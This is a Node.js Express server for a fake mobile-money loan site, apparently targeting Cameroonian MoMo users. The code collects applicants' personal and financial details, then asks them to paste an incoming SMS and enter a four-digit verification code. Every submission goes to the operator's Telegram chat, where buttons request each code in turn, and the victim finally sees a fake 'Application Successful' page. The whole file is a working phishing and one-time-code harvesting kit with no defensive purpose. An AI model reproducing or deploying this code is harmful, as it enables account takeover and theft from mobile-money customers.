const express = require('express');
const path = require('path');
const TelegramBot = require('node-telegram-bot-api');

const app = express();

// --- CONFIGURATION ---
// It will use the variables from your Cloud Dashboard automatically
const BOT_TOKEN = process.env.BOT_TOKEN; 
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID || process.env.CHAT_ID; // Fallback just in case

// Initialize Telegram Bot
const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const pendingSessions = {}; 

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static(__dirname));

// Serve the main page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Helper to send messages to you on Telegram
async function notifyAdmin(text, options = {}) {
  try {
    return await bot.sendMessage(ADMIN_CHAT_ID, text, { parse_mode: 'HTML', ...options });
  } catch (err) {
    console.error('Telegram send error:', err.message);
  }
}

// --- 1. SUBMIT APPLICATION ---
app.post('/submit-application', async (req, res) => {
  const d = req.body;
  const sessionId = Date.now().toString(36);

  const msg = `
🆕 <b>New Loan Application</b>
━━━━━━━━━━━━━━━━
👤 <b>Name:</b> ${d.firstName} ${d.lastName}
📞 <b>Phone:</b> +237 ${d.phone}
💰 <b>Amount:</b> ${Number(d.loanAmount).toLocaleString()} XAF
📆 <b>Term:</b> ${d.loanTerm} months
📋 <b>Type:</b> ${d.loanType}
🎯 <b>Purpose:</b> ${d.purpose}
💼 <b>Employment:</b> ${d.employment}
💵 <b>Income:</b> ${Number(d.income).toLocaleString()} XAF
🆔 <b>Session:</b> <code>${sessionId}</code>
  `;

  const kb = {
    inline_keyboard: [[
      { text: '📩 Request SMS', callback_data: `sms_${sessionId}` },
      { text: '🔑 Request Code', callback_data: `code_${sessionId}` }
    ]]
  };

  pendingSessions[sessionId] = { ...d, sms: null, code: null };
  await notifyAdmin(msg, { reply_markup: kb });

  // Redirect to the SMS paste page
  res.redirect('/verify-sms.html');
});

// --- 2. SMS PASTE ---
app.post('/verify-sms', async (req, res) => {
  const smsMessage = req.body.smsMessage;
  
  await notifyAdmin(
    `📩 <b>SMS Received</b>\n━━━━━━━━━━━━━━━━\n<pre>${escapeHtml(smsMessage)}</pre>`
  );

  // Redirect to the 4-digit code page
  res.redirect('/verify-code.html');
});

// --- 3. FINAL 4-DIGIT CODE ---
app.post('/complete-application', async (req, res) => {
  const { code1, code2, code3, code4 } = req.body;
  const fullCode = `${code1}${code2}${code3}${code4}`;

  await notifyAdmin(
    `🔑 <b>Verification Code Entered</b>\n━━━━━━━━━━━━━━━━\n<code>${fullCode}</code>`
  );

  // Show success screen to the user
  res.send(`
    <html>
    <head>
        <title>Application Received</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body { text-align: center; padding: 50px; font-family: 'Segoe UI', Arial, sans-serif; background-color: #eef2f5; }
            .card { background: white; padding: 40px; border-radius: 15px; max-width: 400px; margin: auto; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
            h2 { color: #004c6c; }
            a { color: #ffcc00; font-weight: bold; text-decoration: none; display: inline-block; margin-top: 20px; padding: 10px 20px; background: #004c6c; border-radius: 8px; color: white;}
        </style>
    </head>
    <body>
        <div class="card">
            <img src="momo-preview.jpg" alt="MoMo Logo" style="width: 100px; border-radius: 20px; margin-bottom: 20px;">
            <h2>Application Successful!</h2>
            <p>Your code has been verified and your loan application is now being processed. We will contact you shortly.</p>
            <a href="/">Return Home</a>
        </div>
    </body>
    </html>
  `);
});

// Handle Telegram inline buttons
bot.on('callback_query', async (query) => {
  const [action, sessionId] = query.data.split('_');
  const session = pendingSessions[sessionId];
  if (!session) return bot.answerCallbackQuery(query.id, { text: 'Session expired' });

  let label = action === 'sms' ? 'SMS' : 'Verification Code';
  bot.answerCallbackQuery(query.id, { text: `Notified: ${label}` });
  await notifyAdmin(`📤 Awaiting user's ${label} for session <code>${sessionId}</code>`);
});

function escapeHtml(s) {
  return String(s).replace(/[&<>]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;'}[c]));
}

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});